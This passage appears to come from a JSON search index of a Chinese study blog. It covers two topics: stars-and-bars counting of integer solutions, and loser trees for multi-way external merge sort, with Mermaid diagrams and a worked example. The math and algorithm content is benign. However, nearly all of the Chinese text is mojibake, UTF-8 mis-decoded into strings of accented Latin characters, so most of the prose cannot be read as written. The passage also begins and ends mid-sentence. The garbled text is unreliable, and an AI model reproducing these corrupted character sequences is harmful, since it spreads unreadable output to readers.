éš”æ¿æ³•æ€æƒ³)ï¼š**\n1. æƒ³è±¡æˆ‘ä»¬æœ‰ k ä¸ªè¦é€‰ä¸­çš„ç‰©å“ï¼ˆâ€œé€‰ä¸­çƒâ€ï¼‰å’Œ nâˆ’k ä¸ªä¸é€‰ä¸­çš„ç‰©å“ï¼ˆâ€œç™½è‰²çƒâ€ï¼‰ã€‚\n2. ä¸ºäº†ä¿è¯é€‰ä¸­çš„ k ä¸ªç‰©å“ä¸ç›¸é‚»ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæŠŠè¿™ k ä¸ªâ€œé€‰ä¸­çƒâ€æ‹¿å‡ºæ¥ã€‚\n3. å‰©ä¸‹ nâˆ’k ä¸ªâ€œç™½è‰²çƒâ€ã€‚å°†å®ƒä»¬æ’æˆä¸€æ’ï¼Œå®ƒä»¬ä¹‹é—´ä»¥åŠä¸¤ç«¯ä¼šå½¢æˆ (nâˆ’k)+1 ä¸ªç©ºéš™ã€‚ _ W _ W _ ... _ W _ (Wä»£è¡¨ç™½è‰²çƒï¼Œ_ ä»£è¡¨ç©ºéš™)\n4. ç°åœ¨ï¼Œå°† k ä¸ªâ€œé€‰ä¸­çƒâ€æ”¾å…¥è¿™ (nâˆ’k)+1 ä¸ªç©ºéš™ä¸­ï¼Œæ¯ä¸ªç©ºéš™æœ€å¤šæ”¾ä¸€ä¸ªçƒã€‚è¿™æ ·å°±èƒ½ä¿è¯ä»»æ„ä¸¤ä¸ªâ€œé€‰ä¸­çƒâ€ä¹‹é—´è‡³å°‘éš”ç€ä¸€ä¸ªâ€œç™½è‰²çƒâ€ï¼Œå³å®ƒä»¬ä¸ç›¸é‚»ã€‚\n5. ä» (nâˆ’k)+1 ä¸ªç©ºéš™ä¸­é€‰æ‹© k ä¸ªç©ºéš™æ¥æ”¾ç½®â€œé€‰ä¸­çƒâ€ï¼Œé€‰æ³•æ•°é‡å°±æ˜¯ C(nâˆ’k+1,k)ã€‚\n\n---\n\n### 2. å…¬å¼ C(n+kâˆ’1,kâˆ’1) æˆ– C(n+kâˆ’1,n): â€œéš”æ¿æ³•â€ / â€œä¸å®šæ–¹ç¨‹éè´Ÿæ•´æ•°è§£â€\n\né—®é¢˜åœºæ™¯1 (ä¸å®šæ–¹ç¨‹è§£)ï¼š\n\næ–¹ç¨‹ x1â€‹+x2â€‹+â€¦+xkâ€‹=n æœ‰å¤šå°‘ç»„éè´Ÿæ•´æ•°è§£ (å³ xiâ€‹â‰¥0)ï¼Ÿ\n\né—®é¢˜åœºæ™¯2 (ç›¸åŒç‰©å“åˆ†ç»™ä¸åŒäºº)ï¼š\n\nå°† n ä¸ªç›¸åŒçš„ç‰©å“åˆ†ç»™ k ä¸ªä¸åŒçš„äººï¼Œæ¯äººå¯ä»¥åˆ†åˆ°0ä¸ªæˆ–å¤šä¸ªï¼Œæœ‰å¤šå°‘ç§åˆ†æ³•ï¼Ÿ\n\nè¿™ä¸¤ä¸ªåœºæ™¯æ˜¯ç­‰ä»·çš„ã€‚xiâ€‹ å¯ä»¥çœ‹ä½œç¬¬ i ä¸ªäººåˆ†åˆ°çš„ç‰©å“æ•°é‡ã€‚\n\n**æ¨å¯¼æ€è·¯ (â€œéš”æ¿æ³•â€ / \"Stars and Bars\"):**\n\n1. ç‰©å“è¡¨ç¤º (Stars)ï¼š æŠŠ n ä¸ªç›¸åŒçš„ç‰©å“æƒ³è±¡æˆ n ä¸ªå°æ˜Ÿæ˜Ÿï¼ˆ*ï¼‰æ’æˆä¸€åˆ—ï¼š\n    \n    * * * ... * (å…± n ä¸ªæ˜Ÿ)\n    \n2. **åˆ†ç»„ (Bars)ï¼š** è¦å°†è¿™ n ä¸ªæ˜Ÿæ˜Ÿåˆ†æˆ k ç»„ (å¯¹åº” k ä¸ªäººæˆ– k ä¸ªå˜é‡ xiâ€‹)ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨è¿™ n ä¸ªæ˜Ÿæ˜Ÿå½¢æˆçš„åºåˆ—ä¸­æ’å…¥ kâˆ’1 ä¸ªéš”æ¿ï¼ˆ`|`ï¼‰ã€‚\n    \n    - ä¾‹å¦‚ï¼Œå¦‚æœ n=5,k=3 (å³ x1â€‹+x2â€‹+x3â€‹=5)ï¼š\n        - `**|*|**` è¡¨ç¤º x1â€‹=2,x2â€‹=1,x3â€‹=2\n        - `***||**` è¡¨ç¤º x1â€‹=3,x2â€‹=0,x3â€‹=2\n        - `||*****` è¡¨ç¤º x1â€‹=0,x2â€‹=0,x3â€‹=5\n3. æ’åˆ—éš”æ¿å’Œæ˜Ÿæ˜Ÿï¼š æˆ‘ä»¬ç°åœ¨æ€»å…±æœ‰ n ä¸ªæ˜Ÿæ˜Ÿå’Œ kâˆ’1 ä¸ªéš”æ¿ã€‚è¿™äº›æ˜Ÿæ˜Ÿå’Œéš”æ¿å…±åŒå æ®äº† n+(kâˆ’1) ä¸ªä½ç½®ã€‚\n    \n    æˆ‘ä»¬çš„é—®é¢˜å°±è½¬åŒ–æˆäº†ï¼šåœ¨è¿™ n+kâˆ’1 ä¸ªä½ç½®ä¸­ï¼Œé€‰æ‹© kâˆ’1 ä¸ªä½ç½®æ”¾ç½®éš”æ¿ï¼ˆå‰©ä¸‹çš„ä½ç½®è‡ªç„¶å°±æ˜¯æ˜Ÿæ˜Ÿäº†ï¼‰ã€‚\n    \n    é€‰æ‹©çš„æ–¹æ³•æ•°å°±æ˜¯ç»„åˆæ•° C(n+kâˆ’1,kâˆ’1)ã€‚\n    \n4. ç­‰ä»·å½¢å¼ï¼š\n    \n    åŒæ ·ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€‰æ‹© n ä¸ªä½ç½®æ”¾ç½®æ˜Ÿæ˜Ÿï¼ˆå‰©ä¸‹çš„ä½ç½®å°±æ˜¯éš”æ¿ï¼‰ã€‚\n    \n    é€‰æ‹©çš„æ–¹æ³•æ•°æ˜¯ C(n+kâˆ’1,n)ã€‚\n    \n    æ ¹æ®ç»„åˆæ•°çš„æ€§è´¨ C(N,K)=C(N,Nâˆ’K)ï¼Œæˆ‘ä»¬çŸ¥é“ C(n+kâˆ’1,kâˆ’1)=C(n+kâˆ’1,(n+kâˆ’1)âˆ’(kâˆ’1))=C(n+kâˆ’1,n)ã€‚æ‰€ä»¥è¿™ä¸¤ä¸ªè¡¨è¾¾å¼æ˜¯ç­‰ä»·çš„ã€‚\n    \n\n**åœºæ™¯å˜å½¢ï¼šå¦‚æœè¦æ±‚æ¯äººè‡³å°‘åˆ†åˆ°1ä¸ªç‰©å“ (å³ xiâ€‹â‰¥1)**\n\n1. **é¢„å…ˆåˆ†é…ï¼š** å…ˆç»™æ¯äººï¼ˆæ¯ä¸ªå˜é‡ï¼‰åˆ†é…1ä¸ªç‰©å“ã€‚è¿™æ ·å°±ç”¨æ‰äº† k ä¸ªç‰©å“ã€‚\n    \n2. **å‰©ä½™åˆ†é…ï¼š** è¿˜å‰©ä¸‹ nâˆ’k ä¸ªç‰©å“ã€‚ç°åœ¨çš„é—®é¢˜å˜æˆå°†è¿™ nâˆ’k ä¸ªç‰©å“åˆ†ç»™ k ä¸ªäººï¼Œæ¯äººå¯ä»¥åˆ†åˆ°0ä¸ªæˆ–å¤šä¸ªã€‚\n    \n3. å¥—ç”¨å…¬å¼ï¼š æŠŠé—®é¢˜ä¸­çš„ n æ›¿æ¢ä¸º nâˆ’kï¼Œå¥—ç”¨ä¸Šé¢çš„éš”æ¿æ³•å…¬å¼ï¼š\n    \n    C((nâˆ’k)+kâˆ’1,kâˆ’1)=C(nâˆ’1,kâˆ’1)ã€‚\n    \n    - æˆ–è€…ç›´è§‚ç†è§£ï¼šæœ‰ n ä¸ªæ˜Ÿæ˜Ÿ `* * ... *`ã€‚å®ƒä»¬ä¹‹é—´æœ‰ nâˆ’1 ä¸ªç©ºéš™ã€‚è¦å°†å®ƒä»¬åˆ†æˆ k ä»½ï¼ˆä¸”æ¯ä»½è‡³å°‘1ä¸ªï¼‰ï¼Œåªéœ€è¦åœ¨è¿™ nâˆ’1 ä¸ªç©ºéš™ä¸­é€‰æ‹© kâˆ’1 ä¸ªä½ç½®æ’å…¥éš”æ¿ã€‚æ–¹æ³•æ•°æ˜¯ C(nâˆ’1,kâˆ’1)ã€‚\n    - ä½ ä¹‹å‰ç¬¬ä¸€ä¸ªé—®é¢˜â€œ4ä½åŒå­¦åˆ†åƒ10ä¸ªç›¸åŒçš„è‹¹æœï¼Œæ¯ä½åŒå­¦è‡³å°‘ä¼šåƒ1ä¸ªâ€ï¼Œå°±æ˜¯è¿™ä¸ªå˜å½¢ã€‚n=10,k=4ï¼Œæ‰€ä»¥æ˜¯ C(10âˆ’1,4âˆ’1)=C(9,3)=84ã€‚\n\n","tags":["æ•°å­¦","ç¦»æ•£æ•°å­¦"],"categories":["æ—¥å¸¸å­¦ä¹ ","ç¦»æ•£æ•°å­¦"]},{"title":"è´¥è€…æ ‘","url":"/2025/06/01/xue-xi/shu-ju-jie-gou/bai-zhe-shu/","content":"# å¤šè·¯å½’å¹¶å¤–æ’åº: è´¥è€…æ ‘\n\n## å¤–æ’åºåŸºæœ¬æ€æƒ³\n**å¤–æ’åº**æ˜¯æŒ‡æ•°æ®é‡å¤ªå¤§ï¼Œæ— æ³•ä¸€æ¬¡æ€§å…¨éƒ¨è£…å…¥å†…å­˜æ—¶ï¼Œå€ŸåŠ©å¤–å­˜ï¼ˆç£ç›˜ï¼‰è¿›è¡Œæ’åºã€‚\nå¸¸ç”¨æ–¹æ³•æ˜¯**å¤šè·¯å½’å¹¶æ’åº**ï¼Œå³å…ˆå°†æ•°æ®åˆ†æˆè‹¥å¹²â€œå½’å¹¶æ®µâ€ï¼Œæ¯æ¬¡å½’å¹¶æ—¶åªå°†éƒ¨åˆ†æ•°æ®è¯»å…¥å†…å­˜ã€‚\nä¸€èˆ¬æ¥è¯´å®ƒçš„ä¼˜ç‚¹æœ‰è¿™ä¸‰ç§ï¼š\n\n- å¤„ç†å¤§è§„æ¨¡æ•°æ®é›†ï¼šå½“æ•°æ®é›†å¤ªå¤§ï¼Œæ— æ³•åœ¨è®¡ç®—æœºçš„å†…å­˜ä¸­å®Œå…¨è£…å…¥æ—¶ï¼Œå¤–éƒ¨æ’åºç®—æ³•æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ã€‚ä¾‹å¦‚ï¼Œåœ¨**å¤„ç†å¤§å‹æ•°æ®åº“æˆ–è¶…å¤§è§„æ¨¡æ–‡ä»¶**æ—¶ï¼Œé€šå¸¸éœ€è¦ä½¿ç”¨å¤–éƒ¨æ’åºç®—æ³•ã€‚\n\n- èŠ‚çº¦å†…å­˜ï¼šå½“å†…å­˜å—é™æ—¶ï¼Œå¤–éƒ¨æ’åºç®—æ³•ä¹Ÿæ˜¯å¾ˆæœ‰ç”¨çš„ã€‚ä¾‹å¦‚ï¼Œåœ¨ç§»åŠ¨è®¾å¤‡ç­‰èµ„æºå—é™çš„è®¡ç®—æœºä¸Šè¿è¡Œæ’åºæ“ä½œæ—¶ï¼Œä½¿ç”¨å¤–éƒ¨æ’åºç®—æ³•å¯ä»¥é¿å…å ç”¨è¿‡å¤šçš„å†…å­˜ã€‚\n\n- å¹¶è¡Œå¤„ç†ï¼šå¤–éƒ¨æ’åºç®—æ³•è¿˜å¯ä»¥é€šè¿‡å°†æ•°æ®é›†åˆ†æˆå¤šä¸ªå—å¹¶å¯¹æ¯ä¸ªå—è¿›è¡Œå¹¶è¡Œå¤„ç†æ¥è¿›ä¸€æ­¥æé«˜æ€§èƒ½ã€‚è¿™æ„å‘³ç€å¯ä»¥ä½¿ç”¨å¤šä¸ªå¤„ç†å™¨æˆ–è®¡ç®—æœºæ¥åŒæ—¶å¤„ç†æ•°æ®é›†ï¼Œä»è€ŒåŠ å¿«æ’åºé€Ÿåº¦ã€‚\n\n**è´¥è€…æ ‘å°±æ˜¯ä¸ºäº†å¹¶è¡Œå¤„ç†ï¼Œè€Œæ„é€ çš„ä¸€ç§æ ‘ã€‚**\n\n---\n## å¤šè·¯å½’å¹¶æ’åº\næƒ³è±¡ä¸€ä¸‹ï¼Œå®¶é‡Œçªç„¶æ¥äº†ä¸€å¤§å †å¿«é€’åŒ…è£¹ï¼Œæ¯ä¸ªåŒ…è£¹é‡Œè£…ç€ä¸åŒå¹´ä»£çš„æ˜ä¿¡ç‰‡ã€‚\næˆ‘æƒ³æŠŠæ‰€æœ‰æ˜ä¿¡ç‰‡æŒ‰æ—¶é—´é¡ºåºæ’åˆ—ï¼Œä½†å®¶é‡Œçš„æ¡Œå­å¤ªå°ï¼Œæ²¡åŠæ³•ä¸€æ¬¡æ€§æ‘Šå¼€å…¨éƒ¨åŒ…è£¹ã€‚æ€ä¹ˆåŠï¼Ÿ\nåªèƒ½**åˆ†æ‰¹å¤„ç†**â€”â€”è¿™å°±æ˜¯â€œå¤–æ’åºâ€çš„ç°å®ç‰ˆï¼Œæ²¡æ³•ç›´æ¥ä¸€æ¬¡æ€§å¤„ç†å¥½è¿™äº›æ•°æ®ã€‚\n\n**å¤šè·¯å½’å¹¶æ’åº**çš„å¥—è·¯å°±åƒå¼€ k ä¸ªå¿«é€’åŒ…è£¹ï¼Œæ¯æ¬¡ä»æ¯ä¸ªåŒ…è£¹é‡ŒæŠ½ä¸€å¼ **æœ€ç‰¹æ®Šçš„æ˜ä¿¡ç‰‡**ï¼ˆæœ€å¹´ä»£ä¹…è¿œçš„ï¼Œæˆ–è€…æ˜¯æœ€å¹´è½»çš„ï¼‰ï¼Œæ‘†æˆä¸€æ’ï¼Œä¸æ–­é‡å¤ï¼Œç›´åˆ°æ‰€æœ‰åŒ…è£¹éƒ½æ‹†å®Œã€‚æœ€åæˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªåŸºäºç‰¹æ®Šç¨‹åº¦é¡ºåºçš„ï¼Œæ˜ä¿¡ç‰‡æ’åˆ—ã€‚æˆ‘ä»¬æŠŠæ‰€æœ‰çš„æ‹†å¼€ï¼Œä¸€æ­¥ä¸€æ­¥ç»„åˆï¼Œæœ€åå¾—åˆ°å½’å¹¶é¡ºåºï¼Œè¿™å°±æ˜¯**kè·¯å½’å¹¶**ã€‚\n![](https://pic.moyuin.top/2025/06/01/683c1f85dc62e.png)\n\n\nä¸€å¼€å§‹æˆ‘ä»¬åªæœ‰ä½¿ç”¨å †æ¥å®Œæˆå¤šè·¯å½’å¹¶ï¼Œä½†æ˜¯äººä»¬å‘ç°å †æ¯æ¬¡å–å‡ºæœ€å°å€¼ä¹‹åï¼ŒæŠŠæœ€åä¸€ä¸ªæ•°æ”¾åˆ°å †é¡¶ï¼Œè°ƒæ•´å †çš„æ—¶å€™ï¼Œ**æ¯æ¬¡éƒ½è¦é€‰å‡ºçˆ¶èŠ‚ç‚¹çš„ä¸¤ä¸ªå­©å­èŠ‚ç‚¹çš„æœ€å°å€¼**ï¼Œ**ç„¶åå†ç”¨å­©å­èŠ‚ç‚¹çš„æœ€å°å€¼å’Œçˆ¶èŠ‚ç‚¹è¿›è¡Œæ¯”è¾ƒï¼Œæ‰€ä»¥æ¯è°ƒæ•´ä¸€å±‚éœ€è¦æ¯”è¾ƒä¸¤æ¬¡**ã€‚\n\nè¿™æ—¶äººä»¬æƒ³èƒ½å¦ç®€åŒ–æ¯”è¾ƒè¿‡ç¨‹ï¼Œè¿™æ—¶å°±æœ‰äº†**èƒœè€…æ ‘**ï¼š\n\t\t\t\t\t\t\t![](https://pic.moyuin.top/2025/06/01/683c1c9c998fd.png)\nè¿™æ ·**æ¯æ¬¡æ¯”è¾ƒåªç”¨è·Ÿè‡ªå·±çš„å…„å¼ŸèŠ‚ç‚¹è¿›è¡Œæ¯”è¾ƒ**å°±å¥½ï¼Œæ‰€ä»¥ç”¨èƒœè€…æ ‘å¯ä»¥æ¯”å †å°‘ä¸€åŠçš„æ¯”è¾ƒæ¬¡æ•°ã€‚\n\nè€Œèƒœè€…æ ‘åœ¨èŠ‚ç‚¹ä¸Šå‡çš„æ—¶å€™ï¼Œéœ€è¦è·å¾—çˆ¶èŠ‚ç‚¹ï¼Œç„¶åå†è·å¾—å…„å¼ŸèŠ‚ç‚¹ï¼Œç„¶åå†æ¯”è¾ƒï¼Œåˆ¤æ–­è¦ä¸è¦ä¸Šå‡ã€‚\nè¿™æ—¶äººä»¬åˆæƒ³èƒ½å¦å†æ¬¡å‡å°‘è¯»å–èŠ‚ç‚¹çš„æ¬¡æ•°ï¼Œäºæ˜¯å°±æœ‰äº†**è´¥è€…æ ‘**ã€‚\n\t\t\t\t\t\t\t![](https://pic.moyuin.top/2025/06/01/683c1de998f2e.png)\n\nåœ¨ä½¿ç”¨è´¥è€…æ ‘çš„æ—¶å€™ï¼Œæ¯ä¸ªæ–°å…ƒç´ ä¸Šå‡æ—¶ï¼Œåªéœ€è¦è·å¾—çˆ¶èŠ‚ç‚¹å¹¶æ¯”è¾ƒå³å¯ã€‚\n\né‚£ä¹ˆèƒœè€…æ ‘ï¼Œè´¥è€…æ ‘åˆ°åº•æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ\n>  è´¥è€…æ ‘æ˜¯èƒœè€…æ ‘çš„ä¸€ç§å˜ä½“ï¼Œå®ƒä¹Ÿæ˜¯ä¸€æ£µå®Œå…¨äºŒå‰æ ‘ã€‚å’Œèƒœè€…æ ‘ä¸åŒçš„æ˜¯ï¼Œè´¥è€…æ ‘çš„èŠ‚ç‚¹å­˜å‚¨çš„æ˜¯è´¥è€…ã€‚\n>  ä¸€èˆ¬é‡‡ç”¨æ•°ç»„æ¨¡æ‹Ÿèƒœè€…æ ‘æˆ–è´¥è€…æ ‘çš„ç»“æ„ï¼Œæ‰€ä»¥èƒœè€…æ ‘ã€è´¥è€…æ ‘é€‰å“ªä¸€ä¸ªéƒ½è¡Œï¼Œèƒœè€…æ ‘ç›¸æ¯”è´¥è€…æ ‘è¦å°‘ç»´æŠ¤ä¸€ä¸ªå† å†›é¡¹ã€‚\n>  è´¥è€…æ ‘ä¾¿äºæŸ¥æ‰¾ã€æ›´æ–°å’Œå½’å¹¶è¾“å‡ºèƒœè€…ã€‚\n\n---\n## è´¥è€…æ ‘ç»“æ„ä¸å®ç°\n### è´¥è€…æ ‘çš„ç»“æ„å›¾\nåŸºç¡€å›¾å½¢ï¼Œç‰¹æ®Šäºæ ‘é¡¶æœ‰ä¸€ä¸ªå”¯ä¸€å€¼èƒœè€…ï¼š\n```mermaid\ngraph TD\n\tW[\"ğŸ¥‡èƒœè€…çš„ç´¢å¼• i\"]\n    A[\"ğŸ¥ˆè´¥è€…ç¬¬1åçš„ç´¢å¼• i\"]\n    B1[\"è´¥è€…ç´¢å¼• i\"]\n    B2[\"è´¥è€…ç´¢å¼• i\"]\n    C1[\"é€‰æ‰‹1\"]\n    C2[\"é€‰æ‰‹2\"]\n    C3[\"é€‰æ‰‹3\"]\n    C4[\"é€‰æ‰‹4\"]\n    W --> A\n    A --> B1\n    A --> B2\n    B1 --> C1\n    B1 --> C2\n    B2 --> C3\n    B2 --> C4\n```\n\nåŸºç¡€åˆ†æï¼ˆå®šæœ€å°è€…èµ¢ï¼‰ï¼š\n![](https://pic.moyuin.top/2025/06/01/683c207f36868.png)\n\n### å»ºæ ‘ä¸ç»´æŠ¤è¿‡ç¨‹\n#### å»ºç«‹è´¥è€…æ ‘\nè®©æˆ‘ä»¬å»ºç«‹ä¸€ä¸ªè´¥è€…æ ‘ï¼Œ`ls[0]`,`ls[1]`, ` ls[2]`, ` ls[3]`, `ls[4]` æ˜¯è´¥è€…æ ‘çš„å†…éƒ¨èŠ‚ç‚¹ï¼ˆå³éå¶å­èŠ‚ç‚¹ï¼‰ï¼Œå­˜å‚¨æ¯ä¸€è½®è´¥è€…çš„ç´¢å¼•ï¼Œb0~b4æ˜¯è´¥è€…æ ‘çš„å¶å­èŠ‚ç‚¹ã€‚\nè´¥è€…æ ‘çš„æ¯ä¸ªèŠ‚ç‚¹å­˜å‚¨çš„éƒ½æ˜¯ä¸¤ä¸¤æ¯”è¾ƒçš„è´¥è€…ï¼ˆæ•°å¤§è€…è´¥ï¼Œæˆ‘ä»¬å…ˆè¦æ±‚å‡ºçš„æ˜¯å„å½’å¹¶è·¯ä¸­çš„æœ€å°å˜›ï¼‰åœ¨åŸæ•°ç»„ä¸­çš„ç´¢å¼•ã€‚\n\n1. `b3` å’Œ `b4` æ¯”è¾ƒï¼Œ`b3` < `b4`, `b4` è´¥ã€‚æ‰€ä»¥çˆ¶èŠ‚ç‚¹ `ls[4]=4`. èƒœè€…æ˜¯ `b3`, æ‰€ä»¥ 3 å°±æ™‹çº§ä¸‹ä¸€è½®ä¸ `b0` æ¯”è¾ƒï¼ˆå›¾ä¸­æ ‘çš„è¾¹ä¸Šçš„æ•°å­—å°±æ˜¯æ™‹çº§çš„é€‰æ‰‹ç¼–å·ï¼‰\n\n2. `b0` ä¸ `b3` æ¯”è¾ƒ, ` b3` < `b0`, `b0` è´¥, æ‰€ä»¥çˆ¶èŠ‚ç‚¹ `ls[2]=0`, èƒœè€…æ˜¯ `b3`ï¼Œæ‰€ä»¥ 3 å°±æ™‹çº§ä¸‹ä¸€è½®ä¸å¦ä¸€è¾¹æ™‹çº§çš„æ¯”è¾ƒ\n\n3. `b1` ä¸ `b2` æ¯”è¾ƒ, `b1` < `b2`, `b2` è´¥, æ‰€ä»¥çˆ¶èŠ‚ç‚¹ `ls[3]=2`. èƒœè€…æ˜¯ `b1`, æ‰€ä»¥1å°±æ™‹çº§ä¸‹ä¸€è½®ä¸b3ä¼šå¸ˆæ€»å†³èµ›ã€‚\n\n4. `b1` ä¸ `b3` æ¯”è¾ƒ, `b3` < `b1`, `b1` è´¥, æ‰€ä»¥çˆ¶èŠ‚ç‚¹ `ls[1]=1`. èƒœè€…æ˜¯ `b3`, æ‰€ä»¥ `ls[0]` è®°å½•æœ€ç»ˆèƒœè€…3ã€‚æ’åºæœ€å°å€¼ï¼Œç®—æ³•è¾“å‡º ` b[3]`ï¼ˆåŸæ•°ç»„ä¸­æœ€å°ï¼‰ã€‚\næœ€åæ„é€ æˆåŠŸï¼š\n```mermaid\ngraph TD\n\n    subgraph \"æœ€ç»ˆè´¥è€…æ ‘ç»“æ„ä¸èŠ‚ç‚¹å€¼\"\n        LS0_final[\"ls[0]=3 (æ€»èƒœè€…ç´¢å¼•)\"]\n        LS1_final[\"ls[1]=1 (è´¥è€…ç´¢å¼•)\"]\n        LS2_final[\"ls[2]=0 (è´¥è€…ç´¢å¼•)\"]\n        LS3_final[\"ls[3]=2 (è´¥è€…ç´¢å¼•)\"]\n        LS4_final[\"ls[4]=4 (è´¥è€…ç´¢å¼•)\"]\n\n        B0_f[\"b0 (10)\"]\n        B1_f[\"b1 (5)\"]\n        B2_f[\"b2 (8)\"]\n        B3_f[\"b3 (2)\"]\n        B4_f[\"b4 (12)\"]\n\n        LS0_final --> LS1_final\n        LS1_final --> LS2_final\n        LS1_final --> LS3_final\n        LS2_final --> B0_f\n        LS2_final --> LS4_final\n        LS4_final --> B3_f\n        LS4_final --> B4_f\n        LS3_final --> B1_f\n        LS3_final --> B2_f\n\n        style LS0_final fill:#90EE90,stroke:#006400,stroke-width:2px\n        style LS1_final fill:#D3D3D3,stroke:#333\n        style LS2_final fill:#D3D3D3,stroke:#333\n        style LS3_final fill:#D3D3D3,stroke:#333\n        style LS4_final fill:#D3D3D3,stroke:#333\n        style B3_f fill:#ADFF2F,stroke:#333 %% Highlight the winner leaf\n    end\n\n    %% Styling\n    classDef playerNode fill:#FFFACD,stroke:#B8860B,stroke-width:1px;\n    class B0,B1,B2,B3,B4 playerNode;\n    class B0_f,B1_f,B2_f,B3_f,B4_f playerNode;\n\n    classDef stepNode fill:#ADD8E6,stroke:#4682B4,stroke-width:1px,border-radius:5px;\n    class Step1,Step2,Step3,Step4,Step5 stepNode;\n\n    classDef winnerNode fill:#FFA07A,stroke:#CD5C5C,stroke-width:1px,shape:capsule;\n    class Step1_W,Step2_W,Step3_W,Step4_W winnerNode;\n```\n\n\n#### ç»´æŠ¤è´¥è€…æ ‘\næˆ‘ä»¬ä¸€èˆ¬ç”¨\"**æ›´æ–°**\"æ¥è¯´æ˜è´¥è€…æ ‘çš„ç»´æŠ¤ï¼š\n\næˆ‘ä»¬æ¥äº†ä¸€ä¸ªæ–°çš„æˆå‘˜ï¼Œèµ°äº†ä¸€ä¸ªæˆå‘˜ï¼Œæƒ³è¦è®©å®ƒåŠ å…¥åé‡å¡‘è¿™é¢—æ ‘ï¼Œå®ç°**è´¥è€…æ ‘çš„æ›´æ–°**ã€‚\nå¯ä»¥æƒ³è±¡æˆ**æ™‹çº§èµ›**ï¼šä¸Šä¸€è½®çš„å† å†›å¸¦ç€â€œæ–°äººâ€é‡æ–°å‚åŠ æ¯”èµ›ï¼Œåªéœ€è¦é‡æ–°æ‰“ä¸€éè‡ªå·±èµ°è¿‡çš„é‚£æ¡â€œæ™‹çº§ä¹‹è·¯â€ï¼Œè€Œå…¶å®ƒå½’å¹¶æ®µï¼ˆå¶å­ï¼‰å®Œå…¨ä¸ç”¨é‡æ–°æ¯”è¾ƒã€‚æ¯æ¬¡å½’å¹¶è¾“å‡ºå’Œæ›´æ–°ï¼Œæœ€å¤šåªéœ€è¦ $\\log_2 k$ æ¬¡æ¯”è¾ƒã€‚\n```mermaid\ngraph TD\n    direction TB\n    %% è´¥è€…æ ‘ç»´æŠ¤ï¼ˆæ’å…¥/æ›¿æ¢ï¼‰åçš„çŠ¶æ€\n    %% åŸå† å†› b3(å€¼2) è¢« æ–°b3(å€¼6) æ›¿æ¢\n    %% è°ƒæ•´å, æ–°å† å†›ä¸º b1(å€¼5)\n\n    LS0_m[\"ls[0]=1 (æ–°èƒœè€…: b1[5])<br/>(åŸls[0]=3)\"]\n    LS1_m[\"ls[1]=3 (æ–°è´¥è€…: æ–°b3[6])<br/>(åŸls[1]=1)\"]\n    LS2_m[\"ls[2]=0 (è´¥è€…: b0[10])<br/>(è°ƒæ•´è·¯å¾„èŠ‚ç‚¹, å€¼æœªå˜)\"]\n    LS3_m[\"ls[3]=2 (è´¥è€…: b2[8])<br/>(éè°ƒæ•´è·¯å¾„èŠ‚ç‚¹)\"]\n    LS4_m[\"ls[4]=4 (è´¥è€…: b4[12])<br/>(è°ƒæ•´è·¯å¾„èŠ‚ç‚¹, å€¼æœªå˜)\"]\n\n    B0_m[\"b0 (10)\"]\n    B1_m[\"b1 (5)\"]\n    B2_m[\"b2 (8)\"]\n    B3_m[\"æ–°b3 (6)<br/>(åŸb3å€¼: 2)\"]\n    B4_m[\"b4 (12)\"]\n\n    LS0_m --> LS1_m\n    LS1_m --> LS2_m\n    LS1_m --> LS3_m\n    LS2_m --> B0_m\n    LS2_m --> LS4_m\n    LS4_m --> B3_m\n    LS4_m --> B4_m\n    LS3_m --> B1_m\n    LS3_m --> B2_m\n\n    classDef defaultLeaf fill:#FFFACD,stroke:#B8860B;\n    classDef changedLeaf fill:#lightblue,stroke:#0000FF,stroke-width:2px,font-weight:bold;\n    classDef newWinnerLeaf fill:#ADFF2F,stroke:#006400,font-weight:bold;\n    \n    classDef pathChangedNode fill:#90EE90,stroke:#006400,stroke-width:2px,font-weight:bold;\n    classDef pathUnchangedNode fill:#lightyellow,stroke:#333,stroke-width:1px,stroke-dasharray:5 5;\n    classDef notOnPathNode fill:#D3D3D3,stroke:#333;\n\n    class LS0_m,LS1_m pathChangedNode;\n    class LS2_m,LS4_m pathUnchangedNode;\n    class LS3_m notOnPathNode;\n    \n    class B0_m,B2_m,B4_m defaultLeaf;\n    class B3_m changedLeaf;\n    class B1_m newWinnerLeaf;\n\n\n```\n\n\n---\næˆ‘ä»¬æ’å…¥ä¸€ä¸ªæ–°çš„èŠ‚ç‚¹ b5(4)ï¼Œæ­¥éª¤ä¹Ÿå¾ˆç®€å•ï¼š\n\nè®©æ–°é€‰æ‰‹ `b5` ä¸ç°æœ‰é€‰æ‰‹ `b4` è¿›è¡Œæ¯”èµ›ã€‚æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ–°çš„å†…éƒ¨èŠ‚ç‚¹ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º `ls[5]`ï¼‰æ¥å­˜å‚¨è¿™åœºæ¯”èµ›çš„è´¥è€…ã€‚\n- `b5(4)` vs `b4(12)`ï¼šèƒœè€…æ˜¯ `b5(4)`ï¼Œè´¥è€…æ˜¯ `b4(12)`ã€‚æ‰€ä»¥ `ls[5]` è®°å½•è´¥è€… `b4` çš„ç´¢å¼• `4`ã€‚\n- ç„¶åï¼Œè¿™åœº `(b5 vs b4)` çš„èƒœè€… (`b5`) å†ä¸åŸå…ˆå’Œ `b4` æ¯”èµ›çš„ `b3` è¿›è¡Œæ¯”èµ›ã€‚åŸå…ˆå­˜å‚¨ `(b3 vs b4)` è´¥è€…çš„èŠ‚ç‚¹ `ls[4]` ç°åœ¨å°†å­˜å‚¨è¿™åœº `(b3 vs èƒœè€…(b5,b4))` æ¯”èµ›çš„è´¥è€…ã€‚\n\t`b3(2)` vs `b5(4)`ï¼šèƒœè€…æ˜¯ `b3(2)`ï¼Œè´¥è€…æ˜¯ `b5(4)`ã€‚æ‰€ä»¥ `ls[4]` è®°å½•è´¥è€… `b5` çš„ç´¢å¼• `5`ã€‚\n- è¿™ä¸ªèƒœè€… `b3(2)` ç»§ç»­æ²¿ç”¨åŸæœ‰çš„è·¯å¾„å‘ä¸Šæ¯”èµ›ï¼š\n\tä¸ `b0(10)` æ¯”èµ›ï¼šèƒœè€… `b3(2)`ï¼Œè´¥è€… `b0(10)`ã€‚`ls[2]` è®°å½•è´¥è€… 